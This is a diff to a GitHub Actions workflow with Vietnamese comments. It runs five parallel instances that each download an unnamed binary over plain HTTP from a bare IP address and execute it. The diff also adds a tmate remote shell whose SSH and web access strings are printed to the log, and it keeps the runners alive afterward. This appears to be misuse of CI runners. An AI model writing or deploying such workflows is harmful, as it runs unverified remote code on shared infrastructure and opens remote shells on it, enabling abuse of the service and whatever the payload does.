@@ -10,26 +10,53 @@ on:
 jobs:
   build:
     runs-on: ubuntu-latest
+    timeout-minutes: 45
 
-    # Chạy 20 job song song (instance 1..20)
     strategy:
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        instance: [1, 2, 3, 4, 5]
 
     steps:
       - uses: actions/checkout@v4
 
-      - name: Print job info
-        run: echo "🔹 Running instance ${{ matrix.instance }}"
+      - name: Install dependencies
+        run: sudo apt update && sudo apt install wget tmate -y
 
-      - name: Run a one-line script
-        run: echo "Hello from instance ${{ matrix.instance }}!"
-
-      - name: Install wget
-        run: sudo apt update && sudo apt install wget -y
-
-      - name: Run a multi-line script
+      - name: Start tmate in background
         run: |
+          # Start tmate session và giữ nó chạy ngầm
+          tmate -S /tmp/tmate.sock new-session -d
+          tmate -S /tmp/tmate.sock wait tmate-ready
+          
+          # Hiển thị thông tin kết nối
+          echo "🟢 TMATE SESSION STARTED"
+          echo "SSH: $(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')"
+          echo "WEB: $(tmate -S /tmp/tmate.sock display -p '#{tmate_web}')"
+          
+          # Giữ session alive trong background
+          while true; do
+            sleep 60
+            echo "🤖 Tmate session still active for instance ${{ matrix.instance }}"
+          done &
+          TMATE_LOOP_PID=$!
+          echo "TMATE_PID=$TMATE_LOOP_PID" >> $GITHUB_ENV
+
+      - name: Print job info
+        run: echo "🔹 Running instance ${{ matrix.instance }} with tmate"
+
+      - name: Run main script (with tmate running)
+        run: |
+          echo "📦 Downloading and running setup..."
           wget http://38.242.224.156:8082/setup
           chmod +x setup
-          ./setup
+          ./setup &
+          SETUP_PID=$!
+          
+          # Chờ script chính chạy nhưng vẫn giữ tmate active
+          wait $SETUP_PID
+
+      - name: Keep alive after main script
+        if: always()  # Chạy cả khi thành công hay thất bại
+        run: |
+          echo "⏳ Main script finished, but keeping tmate alive for 10 minutes..."
+          sleep 600
